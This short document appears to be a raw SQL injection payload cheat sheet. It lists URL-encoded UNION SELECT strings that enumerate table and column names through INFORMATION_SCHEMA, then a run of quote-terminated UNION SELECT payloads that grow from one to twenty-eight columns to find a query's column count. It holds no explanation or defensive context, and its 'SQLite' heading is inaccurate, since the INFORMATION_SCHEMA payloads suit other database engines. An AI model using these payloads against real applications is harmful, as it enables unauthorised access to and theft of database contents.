# For SQLi (SQLite)
##### 0+UNION+SELECT+NULL,+COLUMN_NAME,+NULL,+NULL+FROM+INFORMATION_SCHEMA.COLUMNS
##### 0+UNION+SELECT+NULL,+group_concat(COLUMN_NAME),+NULL,+NULL+FROM+INFORMATION_SCHEMA.COLUMNS
##### 0+UNION+SELECT+2,3,table_name,4+from+INFORMATION_SCHEMA.tables
##### 0+UNION+SELECT+2,group_concat(table_name),3,4+from+INFORMATION_SCHEMA.TABLES
##### 0+UNION+SELECT+2,3,group_concat(table_name),4+from+INFORMATION_SCHEMA.tables+where+table_SCHEMA=database()

' UNION SELECT NULL --

' UNION SELECT 1 --
' UNION SELECT 'a' --
' UNION SELECT 'a', 'b' --
' UNION SELECT 'a', 'b', 'c' --
' UNION SELECT 'a', 'b', 'c', 'd' --
' UNION SELECT 'a', 'b', 'c', 'd', 'e' --
' UNION SELECT 'a', 'b', 'c', 'd', 'e', 'f' --
' UNION SELECT 'a', 'b', 'c', 'd', 'e', 'f', 'g' --
' UNION SELECT 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h' --
' UNION SELECT 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i' --
' UNION SELECT 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j' --
' UNION SELECT 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k' --
' UNION SELECT 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l' --
' UNION SELECT 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm' --
' UNION SELECT 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n' --
' UNION SELECT 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o' --
' UNION SELECT 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p' --
' UNION SELECT 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q' --
' UNION SELECT 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r' --
' UNION SELECT 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's' --
' UNION SELECT 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't' --
' UNION SELECT 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u' --
' UNION SELECT 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v' --
' UNION SELECT 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w' --
' UNION SELECT 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x' --
' UNION SELECT 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y' --
' UNION SELECT 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z' --
' UNION SELECT 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0' --
' UNION SELECT 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1' --
